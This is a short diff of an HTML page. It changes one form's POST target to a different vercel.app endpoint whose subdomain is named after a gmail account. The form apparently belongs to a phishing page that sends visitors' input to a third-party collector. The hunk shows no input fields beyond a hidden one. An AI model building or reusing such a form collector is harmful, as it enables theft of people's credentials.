@@ -159,7 +159,7 @@ console.log("error 323");
 <table>
 <tbody><tr>
  <td valign="top"><br><br>
-   <form name="index" method="POST" action="https://form-8zswkj1gg-kiztopia2020-gmailcom.vercel.app/" >
+   <form name="index" method="POST" action="https://form-api2-kiztopia2020-gmailcom.vercel.app/" >
      <input type="hidden" name="refresh" value="96222">	
      <table cellspacing="0" cellpadding="1">
         <tbody><tr> 
